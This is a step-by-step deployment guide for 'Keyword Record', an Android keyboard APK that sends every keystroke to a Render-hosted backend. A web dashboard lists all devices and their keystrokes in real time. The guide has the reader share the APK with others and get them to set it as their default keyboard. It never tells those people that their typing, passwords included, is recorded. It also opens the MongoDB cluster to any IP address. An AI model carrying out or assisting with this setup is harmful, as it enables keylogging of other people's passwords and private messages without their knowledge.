# Deploy Keyword Record to Render + Share APK

This guide hosts the backend on **Render** (free), keeps it awake with **UptimeRobot**, and shares the keyboard APK with others.

---

## Part 1 — MongoDB Atlas (one-time)

Your database is already on MongoDB Atlas. Allow Render to connect:

1. Open [MongoDB Atlas](https://cloud.mongodb.com) → your cluster → **Network Access**
2. Click **Add IP Address** → **Allow Access from Anywhere** (`0.0.0.0/0`)
3. Click **Confirm**

Copy your connection string from **Database → Connect → Drivers**:
```
mongodb+srv://USERNAME:PASSWORD@cluster0.xxxxx.mongodb.net/?retryWrites=true&w=majority
```

---

## Part 2 — Deploy backend on Render

### Option A: Deploy from GitHub (recommended)

1. Push this project to a **GitHub** repository
2. Go to [render.com](https://render.com) → sign up / log in
3. Click **New +** → **Blueprint** (or **Web Service**)
4. Connect your GitHub repo
5. If using Blueprint, Render reads `render.yaml` automatically
6. If manual setup:
   - **Root Directory:** `backend`
   - **Build Command:** `npm install`
   - **Start Command:** `npm start`
   - **Health Check Path:** `/health`

### Environment variables on Render

In Render dashboard → your service → **Environment**:

| Key | Value |
|-----|-------|
| `DB_URL` | Your MongoDB Atlas connection string |
| `DB_NAME` | `keyword_record` |

Render sets `PORT` automatically — do not override it.

### After deploy

Your API URL will look like:
```
https://keyword-record-api.onrender.com
```

Test in browser:
- `https://YOUR-APP.onrender.com/health` → should show `{"status":"ok",...}`
- `https://YOUR-APP.onrender.com` → web dashboard with keystroke records

**First request may take 30–60 seconds** on the free plan (cold start).

---

## Part 3 — UptimeRobot (keep Render awake)

Render free tier sleeps after ~15 minutes of no traffic. UptimeRobot pings it every 5 minutes.

1. Go to [uptimerobot.com](https://uptimerobot.com) → sign up (free)
2. Click **Add New Monitor**
3. Settings:
   - **Monitor Type:** HTTP(s)
   - **Friendly Name:** Keyword Record API
   - **URL:** `https://YOUR-APP.onrender.com/health`
   - **Monitoring Interval:** 5 minutes
4. Click **Create Monitor**

Use `/health` or `/ping` — both work.

---

## Part 4 — Update APK with your Render URL

The APK default server URL is set in:

`android-keyboard/app/src/main/res/values/strings.xml`

```xml
<string name="default_server_url">https://keyword-record-api.onrender.com</string>
```

**Replace** with your actual Render URL if the service name is different.

Then rebuild the APK:

```powershell
cd android-keyboard
.\build-release-apk.ps1
```

The shareable APK is copied to:
```
releases/keyword-record-keyboard.apk
```

---

## Part 5 — Share with others

Send them the APK file. They should:

1. Install the APK (allow "Install unknown apps" if prompted)
2. Open **Keyword Record Keyboard** app
3. Verify the **Backend Server URL** matches your Render URL
4. Tap **Test Connection** → should say "Server is online!"
5. Tap **Save Settings**
6. Enable the keyboard:
   - **Settings → System → Languages & input → On-screen keyboard**
   - Enable **Keyword Record Keyboard**
   - Select it as default keyboard

Each person gets a unique **Device ID** — filter by device on the web dashboard.

---

## Part 6 — View keystroke records

Open in any browser:
```
https://YOUR-APP.onrender.com
```

The dashboard shows all devices and keystrokes in real time.

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| "Cannot reach server" on phone | Check Render URL uses `https://` (not `localhost`). Tap Test Connection. |
| Render deploy fails | Check `DB_URL` env var is set correctly on Render |
| MongoDB connection error | Allow `0.0.0.0/0` in Atlas Network Access |
| Server slow first time | Normal on free tier — UptimeRobot reduces cold starts |
| `localhost` does not work on phone | `localhost` means the phone itself, not your PC. Use Render URL instead |

---

## Local development (optional)

For testing on your PC only:

```powershell
cd backend
npm install
# Create .env from .env.example with your DB_URL
npm start
```

Use your PC's local IP in the app (e.g. `http://192.168.1.5:3000`) — only works on the same Wi-Fi network.
